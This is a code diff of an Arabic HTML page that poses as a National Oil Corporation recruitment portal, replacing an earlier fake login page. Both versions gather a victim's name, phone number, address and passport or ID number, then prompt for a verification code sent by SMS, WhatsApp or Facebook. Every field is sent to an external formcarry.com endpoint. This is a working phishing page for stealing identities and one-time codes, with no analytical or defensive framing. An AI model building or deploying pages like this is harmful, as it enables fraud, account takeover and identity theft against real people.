@@ -1,185 +1,253 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>تسجيل الدخول</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>منصة التوظيف - المؤسسة الوطنية للنفط</title>
   <style>
     body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(to bottom right, #002b45, #003c60);
+      font-family: 'Tahoma', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f7fa;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
-      direction: rtl;
     }
 
-    .container {
-      background-color: #fff;
-      border-radius: 20px;
-      padding: 30px 20px;
-      width: 90%;
-      max-width: 420px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+    .form-container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 450px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
+      box-sizing: border-box;
+      border-top: 6px solid #003366; /* أزرق المؤسسة */
+    }
+
+    .form-container h2 {
+      margin-top: 0;
+      color: #003366;
       text-align: center;
-      border-top: 6px solid #e30613;
-      position: relative;
+      font-size: 20px;
+      margin-bottom: 20px;
     }
 
     .logo {
-      width: 80px;
-      margin: 0 auto 20px;
       display: block;
+      margin: 0 auto 10px;
+      width: 80px;
     }
 
-    h2 {
-      color: #002b45;
-      margin-bottom: 25px;
-      font-weight: 800;
+    .form-group {
+      margin-bottom: 15px;
+      text-align: right;
     }
 
-    input {
+    label {
+      font-size: 14px;
+      margin-bottom: 6px;
+      display: block;
+      color: #003366;
+      font-weight: bold;
+    }
+
+    input, select {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 18px;
-      border-radius: 12px;
-      border: 1.5px solid #ccc;
-      font-size: 18px;
+      padding: 10px 8px;
+      font-size: 14px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
       box-sizing: border-box;
-      text-align: center;
-      transition: border-color 0.3s;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #002b45;
     }
 
     button {
       width: 100%;
       padding: 12px;
-      background-color: #e30613;
+      margin-top: 10px;
+      font-size: 15px;
+      background-color: #003366;
       color: white;
-      font-size: 18px;
       border: none;
-      border-radius: 12px;
+      border-radius: 6px;
       cursor: pointer;
-      font-weight: bold;
-      transition: background-color 0.3s;
+      transition: background 0.3s ease;
     }
 
     button:hover {
-      background-color: #c00511;
+      background-color: #002244;
     }
 
-    #notification {
-      background-color: #f4f4f4;
-      border: 1px solid #ccc;
-      padding: 12px;
-      border-radius: 10px;
-      margin-bottom: 15px;
-      color: #002b45;
+    button#resendBtn {
+      background-color: #888;
+    }
+
+    #timer {
+      font-size: 13px;
+      color: #cc9900; /* ذهبي */
+      margin-top: 8px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    #verification-section {
       display: none;
-      font-size: 16px;
-      animation: fadeInOut 4s forwards;
-    }
-
-    @keyframes fadeInOut {
-      0%   { opacity: 0; }
-      10%  { opacity: 1; }
-      90%  { opacity: 1; }
-      100% { opacity: 0; display: none; }
-    }
-
-    #codeSection {
-      display: none;
-      margin-top: 15px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- شعار المؤسسة الوطنية للنفط -->
-    <img src="uy.jpeg" alt="شعار المؤسسة الوطنية للنفط" class="logo">
 
-    <h2>طلب الدخول</h2>
-    <input type="text" id="fullName" placeholder="الاسم بالكامل" required>
-    <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
+  <div class="form-container">
+    <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/f/f8/NOC_logo.svg/1200px-NOC_logo.svg.png" alt="شعار المؤسسة الوطنية للنفط" class="logo">
+    <h2>منصة التوظيف - المؤسسة الوطنية للنفط</h2>
 
-    <div id="notification">تم إرسال الكود عبر إشعار فيسبوك أو واتساب أو رسالة نصية</div>
+    <form id="main-form">
+      <div id="step1">
+        <div class="form-group">
+          <label>الاسم بالكامل</label>
+          <input type="text" id="fullName" required pattern="^[\u0600-\u06FF\s]{5,}$" title="الاسم يجب أن يكون باللغة العربية وبحد أدنى 5 أحرف">
+        </div>
+        <div class="form-group">
+          <label>العنوان</label>
+          <input type="text" id="address" required>
+        </div>
+        <div class="form-group">
+          <label>نوع الوثيقة (اختياري)</label>
+          <select id="documentType" onchange="toggleDocumentNumber()">
+            <option value="">بدون</option>
+            <option value="جواز السفر">جواز السفر</option>
+            <option value="البطاقة الشخصية">البطاقة الشخصية</option>
+          </select>
+        </div>
+        <div class="form-group" id="documentNumberGroup" style="display: none;">
+          <label>رقم الوثيقة</label>
+          <input type="text" id="documentNumber">
+        </div>
+        <div class="form-group">
+          <label>رقم الهاتف</label>
+          <input type="text" id="phone" required pattern="^09[1-5][0-9]{7}$" title="رقم ليبي يبدأ بـ 091 إلى 095 ويتكون من 10 أرقام">
+        </div>
+        <button type="button" onclick="submitStep1()">أكمل الطلب</button>
+      </div>
 
-    <div id="codeSection">
-      <input type="text" id="codeInput" placeholder="رمز التحقق" maxlength="8">
-    </div>
-
-    <button id="actionBtn" onclick="handleAction()">طلب التحقق</button>
+      <div id="verification-section">
+        <div class="form-group">
+          <label>رمز التحقق</label>
+          <input type="text" id="code" pattern="^[a-zA-Z0-9]{6,8}$" required>
+        </div>
+        <div class="form-group">
+          <label>إعادة كتابة رمز التحقق</label>
+          <input type="text" id="confirmCode" required>
+        </div>
+        <div id="timer">02:00</div>
+        <button type="button" onclick="submitAll()">تحقيق الرمز</button>
+        <button type="button" id="resendBtn" onclick="restartTimer()" style="display:none;">إعادة إرسال الرمز</button>
+      </div>
+    </form>
   </div>
 
   <script>
-    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB";
-    let step = 1;
+    let countdown;
+    let timeLeft = 120;
 
-    function handleAction() {
-      if (step === 1) {
-        const fullName = document.getElementById("fullName").value.trim();
-        const myPhone = document.getElementById("myPhone").value.trim();
-
-        if (!/^09\d{8}$/.test(myPhone)) {
-          alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 09 ويتكون من 10 أرقام.");
-          return;
-        }
-
-        if (fullName.length < 3) {
-          alert("يرجى إدخال الاسم بالكامل (على الأقل 3 أحرف).");
-          return;
-        }
-
-        fetch(formcarryURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            fullName: fullName,
-            myPhone: myPhone
-          })
-        }).then(() => {
-          const notification = document.getElementById("notification");
-          notification.style.display = "block";
-
-          setTimeout(() => {
-            notification.style.display = "none";
-            document.getElementById("codeSection").style.display = "block";
-            step = 2;
-          }, 4000);
-        }).catch((error) => {
-          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
-          console.error(error);
-        });
-
-      } else if (step === 2) {
-        const code = document.getElementById("codeInput").value.trim();
-
-        if (!/^[0-9a-zA-Z]{6,8}$/.test(code)) {
-          alert("يرجى إدخال رمز تحقق صحيح يتكون من 6 إلى 8 أرقام أو حروف.");
-          return;
-        }
-
-        fetch(formcarryURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            verificationCode: code
-          })
-        }).then(() => {
-          alert("تم تأكيد الكود بنجاح ✅");
-          document.getElementById("actionBtn").innerText = "تم التحقق";
-        }).catch((error) => {
-          alert("فشل في إرسال الكود. حاول مرة أخرى.");
-          console.error(error);
-        });
+    function toggleDocumentNumber() {
+      const type = document.getElementById('documentType').value;
+      const group = document.getElementById('documentNumberGroup');
+      if (type === "جواز السفر" || type === "البطاقة الشخصية") {
+        group.style.display = 'block';
+      } else {
+        group.style.display = 'none';
+        document.getElementById('documentNumber').value = '';
       }
+    }
+
+    function startTimer() {
+      timeLeft = 120;
+      document.getElementById('resendBtn').style.display = 'none';
+      countdown = setInterval(() => {
+        const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+        const s = String(timeLeft % 60).padStart(2, '0');
+        document.getElementById('timer').textContent = `${m}:${s}`;
+        timeLeft--;
+        if (timeLeft < 0) {
+          clearInterval(countdown);
+          document.getElementById('timer').textContent = "انتهى الوقت!";
+          document.getElementById('resendBtn').style.display = 'block';
+        }
+      }, 1000);
+    }
+
+    function restartTimer() {
+      document.getElementById('code').value = '';
+      document.getElementById('confirmCode').value = '';
+      startTimer();
+    }
+
+    function submitStep1() {
+      const name = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const documentType = document.getElementById('documentType').value;
+      const documentNumber = document.getElementById('documentNumber').value.trim();
+
+      if (!/^[\u0600-\u06FF\s]{5,}$/.test(name) || !/^09[1-5][0-9]{7}$/.test(phone) || !address) {
+        alert("يرجى تعبئة الحقول بشكل صحيح.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('الاسم', name);
+      formData.append('العنوان', address);
+      formData.append('نوع الوثيقة', documentType);
+      formData.append('رقم الوثيقة', documentNumber);
+      formData.append('رقم الهاتف', phone);
+
+      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('verification-section').style.display = 'block';
+        startTimer();
+      }).catch(() => {
+        alert("حدث خطأ أثناء الإرسال.");
+      });
+    }
+
+    function submitAll() {
+      const code = document.getElementById('code').value.trim();
+      const confirmCode = document.getElementById('confirmCode').value.trim();
+
+      if (timeLeft < 0) {
+        alert("انتهى الوقت! أعد إرسال الرمز.");
+        return;
+      }
+
+      if (!/^[a-zA-Z0-9]{6,8}$/.test(code) || code !== confirmCode) {
+        alert("رمز التحقق غير صحيح أو غير متطابق.");
+        return;
+      }
+
+      const name = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      const formData = new FormData();
+      formData.append('الاسم', name);
+      formData.append('العنوان', address);
+      formData.append('رقم الهاتف', phone);
+      formData.append('رمز التحقق', code);
+
+      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        alert("تم إرسال البيانات بنجاح.");
+      }).catch(() => {
+        alert("حدث خطأ أثناء إرسال رمز التحقق.");
+      });
     }
   </script>
 </body>
